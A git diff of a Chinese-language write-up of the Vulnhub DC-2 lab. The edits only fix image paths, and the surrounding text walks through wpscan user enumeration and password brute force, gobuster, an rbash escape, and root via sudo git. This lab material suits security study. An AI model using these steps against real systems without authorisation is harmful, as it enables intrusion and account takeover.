@@ -10,29 +10,29 @@
 
 使用`arp-scan -l`或者`netdiscover -r 192.168.10.1/24`
 
-![](D:\stu\vulnhub\DC靶场\pic-2\1.jpg)
+![](./pic-2/1.jpg)
 
 # 信息收集 
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\DC靶场\pic-2\2.jpg)
+![](./pic-2/2.jpg)
 
 ## 网站信息探测
 
 访问80端口默认界面，但是访问IP时，跳转到一个域名`dc-2`，所以这里对该IP进行绑定该域名，编辑文件`/etc/hosts`，再次访问80端口即可成功访问
 
-![](D:\stu\vulnhub\DC靶场\pic-2\4.jpg)
+![](./pic-2/4.jpg)
 
 并且这时候发现网站中的显示涉及到`wordpress`CMS，尝试使用`whatweb`等工具进一步验证，发现为`wordpress 4.7.10`版本
 
-![](D:\stu\vulnhub\DC靶场\pic-2\5.jpg)
+![](./pic-2/5.jpg)
 
 # 网站漏洞寻找
 
 发现`flag1`，查看，提示可能需要使用`cewl`工具来生成字典，用于密码破解
 
-![](D:\stu\vulnhub\DC靶场\pic-2\5-1.jpg)
+![](./pic-2/5-1.jpg)
 
 那么使用`cewl`生成一个针对网站的字典文件`words`，这个是生成在当前目录下的
 
@@ -46,7 +46,7 @@ cewl http://dc-2 -w words -m 3
 wpscan --url http://dc-2
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-2\6.jpg)
+![](./pic-2/6.jpg)
 
 那么进一步进行用户名枚举，发现三个用户名
 
@@ -54,7 +54,7 @@ wpscan --url http://dc-2
 wpscan --url http://dc-2 -e u
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-2\7.jpg)
+![](./pic-2/7.jpg)
 
 尝试进行密码暴力破解，有两组成功
 
@@ -62,7 +62,7 @@ wpscan --url http://dc-2 -e u
 wpscan --url http://dc-2 -e u -P words
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-2\8.jpg)
+![](./pic-2/8.jpg)
 
 | 用户名  | 密码         |
 | ------- | ------------ |
@@ -75,13 +75,13 @@ wpscan --url http://dc-2 -e u -P words
 gobuster dir -u http://dc-2 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -d -b 404,403
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-2\9.jpg)
+![](./pic-2/9.jpg)
 
 # ssh登录至tom
 
 访问`wp-login.php`界面，然后使用上面的两组账户进行登录，根据`flag1`提示，下一个`flag`就在其中一个账户下，登录`jerry`账号后，发现`flag2`
 
-![](D:\stu\vulnhub\DC靶场\pic-2\10.jpg)
+![](./pic-2/10.jpg)
 
 把其内容翻译就是：
 
@@ -103,15 +103,15 @@ ssh tom@192.168.10.4 -p 7744
 
 测试一番后，发现`/`不被允许使用
 
-![](D:\stu\vulnhub\DC靶场\pic-2\11.jpg)
+![](./pic-2/11.jpg)
 
 那么使用`help`查看一下，主要就是发现`compgen`可用
 
-![](D:\stu\vulnhub\DC靶场\pic-2\12.jpg)
+![](./pic-2/12.jpg)
 
 使用`compgen -c`列出当前可用的命令，除了上面发现的，还发现几个命令
 
-![](D:\stu\vulnhub\DC靶场\pic-2\13.jpg)
+![](./pic-2/13.jpg)
 
 `ok`，那么就可以进行`rbash`逃逸了，如果不清楚的话，可以进行百度搜索，因为这里的`/`不被允许使用，所以对于`less、vi`等可能无法进行逃逸
 
@@ -119,7 +119,7 @@ ssh tom@192.168.10.4 -p 7744
 
 直接使用`set`命令可以看到相关问题
 
-![](D:\stu\vulnhub\DC靶场\pic-2\14.jpg)
+![](./pic-2/14.jpg)
 
 这设置的是系统层面的，并且当前用户并没有权限，所以无法直接在这里允许`set`，但是可以通过与`vi`结合使用，来做一个临时的
 
@@ -141,7 +141,7 @@ export PATH=/usr/bin:$PATH
 
 环境变量成功后，发现`cat`命令成功，说明`rbash`逃逸成功
 
-![](D:\stu\vulnhub\DC靶场\pic-2\16.jpg)
+![](./pic-2/16.jpg)
 
 这里的`flag3`提示我，最好使用`su`切换到用户`jerry`，然后输入上面的密码`adipiscing`
 
@@ -153,7 +153,7 @@ su jerry
 
 可以，登录成功，并查看`flag4`，提示`git`的提权
 
-![](D:\stu\vulnhub\DC靶场\pic-2\17.jpg)
+![](./pic-2/17.jpg)
 
 那么搜索一下，`git`命令是具有SUID还是`sudo`
 
@@ -162,11 +162,11 @@ find / -perm -4000 -print 2>/dev/null
 sudo -l
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-2\18.jpg)
+![](./pic-2/18.jpg)
 
 对于`git`的`sudo`提权，方法很多，可以借助网站`gtfobins.github.io`搜索
 
-![](D:\stu\vulnhub\DC靶场\pic-2\19.jpg)
+![](./pic-2/19.jpg)
 
 使用其中一个进行测试
 
@@ -177,11 +177,11 @@ sudo git -p help config
 
 使用上面命令后，提权成功
 
-![](D:\stu\vulnhub\DC靶场\pic-2\20.jpg)
+![](./pic-2/20.jpg)
 
 切换到`root`的主目录，看到最终`flag`
 
-![](D:\stu\vulnhub\DC靶场\pic-2\21.jpg)
+![](./pic-2/21.jpg)
 
 
 
@@ -200,7 +200,7 @@ sudo git -p help config
 
 还有一种`rbash`逃逸，是在`BASH_CMDS`是可修改时，可以利用，这个可以通过`set`命令查看是否有无，具体能否修改可以测试一下
 
-![](D:\stu\vulnhub\DC靶场\pic-2\22.jpg)
+![](./pic-2/22.jpg)
 
 然后通过下面代码执行
 
